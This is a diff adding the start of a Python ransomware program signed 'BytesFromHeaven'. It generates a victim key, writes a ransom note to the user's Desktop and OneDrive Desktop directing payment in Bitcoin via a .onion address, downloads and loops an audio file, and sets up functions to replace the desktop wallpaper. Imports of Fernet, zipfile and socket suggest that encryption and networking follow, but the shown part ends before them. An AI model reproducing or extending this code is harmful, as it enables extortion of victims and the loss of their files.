@@ -1,0 +1,130 @@
+try:
+
+    from cryptography.fernet import Fernet 
+    import threading
+    import zipfile
+    from pathlib import Path
+    import getpass
+    import socket
+    from PIL import Image, ImageDraw, ImageFont
+    import time
+    import shutil
+    import ctypes
+    import os
+    import pygame
+    import winsound
+    import random
+    import string
+    import requests
+    time.sleep(3)
+
+    ___us_0e = os.getlogin()
+    def generate_key(length=8):
+        chars = string.ascii_lowercase + string.digits
+        return ''.join(random.choice(chars) for _ in range(length))
+    Key = generate_key()
+    os.chdir(f"C:\\\\Users\\\\{___us_0e}\\\\Desktop")
+    with open(f'{Key}_Link.txt', 'w') as file:
+        file.write(f"""
+                    Hello, as you already know, this computer is encrypted.
+                    If you want to decrypt your personal files or any data you have here, you must follow our instructions.
+
+                    1. You will need to contact us.
+                        - You can contact us at "jhjqe4vmwfpmjgrminvt7hx7jmcmw2lw45emqmdqyjkvux2eh5lujnyd.onion".
+                        - For this you need T.O.R. Browser.
+                        - You can download it by searching "Tor Project Download." on Google and click the first link.
+                    
+                    2. After you downloaded the browser.
+                        - You will paste the address we gave you.
+                        - Use this "{Key}" key to contact us in the "Contact Us." section.
+                        - Message us and we will try to respond as soon as possible.
+
+                    3. How you would decrypt your data?
+                        - It is very simple, pay us the amount of money we want and we will give you:
+                            * The decryption key.
+                            * An application ".exe"; use the decryption key inside it to decrypt your files.
+                            * And your wallpaper back.
+
+                    You can decrypt your files for free. If you want, we can give you a game that you can play.
+                    More information is available on the website; chat with us for even more.
+                    We will negotiate about the prices; more information is available on the website.
+                    We accept only Bitcoin.
+                    Thank you for your comprehending!
+                    Have a great day.
+                        Sincerely,
+                            BytesFromHeaven
+                    """)
+    os.chdir(f"C:\\\\Users\\\\{___us_0e}\\\\OneDrive\\\\Desktop")
+    with open(f'{Key}_Link.txt', 'w') as file:
+        file.write(f"""
+                    Hello, as you already know, this computer is encrypted.
+                    If you want to decrypt your personal files or any data you have here, you must follow our instructions.
+
+                    1. You will need to contact us.
+                        - You can contact us at "jhjqe4vmwfpmjgrminvt7hx7jmcmw2lw45emqmdqyjkvux2eh5lujnyd.onion".
+                        - For this you need T.O.R. Browser.
+                        - You can download it by searching "Tor Project Download." on Google and click the first link.
+                    
+                    2. After you downloaded the browser.
+                        - You will paste the address we gave you.
+                        - Use this "{Key}" key to contact us in the "Contact Us." section.
+                        - Message us and we will try to respond as soon as possible.
+
+                    3. How will you decrypt your data?
+                        - It is very simple, pay us the amount of money we want and we will give you:
+                            * The decryption key.
+                            * An application ".exe"; use the decryption key inside it to decrypt your files.
+                            * And your wallpaper back.
+
+                    You can decrypt your files for free. If you want, we can give you a game that you can play.
+                    More information is available on the website; chat with us for even more.
+                    We will negotiate about the prices; more information is available on the website.
+                    We accept only Bitcoin.
+                    Thank you for your comprehending!
+                    Have a great day.
+                        Sincerely,
+                            BytesFromHeaven
+                    """)
+    def play_sound():
+        url = "https://soundfxcenter.com/video-games/angry-birds/8d82b5_Angry_Birds_Theme_Song.mp3"
+        filename = "angry_birds.mp3"
+
+        if not os.path.exists(filename):
+            with open(filename, "wb") as f:
+                f.write(requests.get(url).content)
+
+        pygame.mixer.init()
+        pygame.mixer.music.load(filename)
+        pygame.mixer.music.play(-1)
+
+        while True:
+            time.sleep(1)
+
+    music_thread = threading.Thread(target=play_sound, daemon=True)
+    music_thread.start()
+
+    def get_current_wallpaper():
+        buffer = ctypes.create_unicode_buffer(512)
+        ctypes.windll.user32.SystemParametersInfoW(0x0073, len(buffer), buffer, 0)
+        return buffer.value
+
+    def set_desktop_background_windows(img_path):
+        abs_path = os.path.abspath(img_path)
+        SPI_SETDESKWALLPAPER = 20
+        SPIF_UPDATEINIFILE = 1
+        SPIF_SENDCHANGE = 2
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
+
+    def create_image_with_text(text, img_path='background.bmp', size=(1920, 1080), bg_color=(255, 255, 255), text_color=(0, 0, 0), font_path=None, font_size=100):
+        img = Image.new('RGB', size, color=bg_color)
+        draw = ImageDraw.Draw(img)
+        if font_path and os.path.exists(font_path):
+            font = ImageFont.truetype(font_path, font_size)
+        else:
+            font = ImageFont.load_default()
+        bbox = draw.textbbox((0, 0), text, font=font)
+        text_width = bbox[2] - bbox[0]
+        text_height = bbox[3] - bbox[1]
+        position = ((size[0] - text_width) // 2, (size[1] - text_height) // 2)
+        draw.text(position, text, fill=text_color, font=font)
+        img.save(img_path)
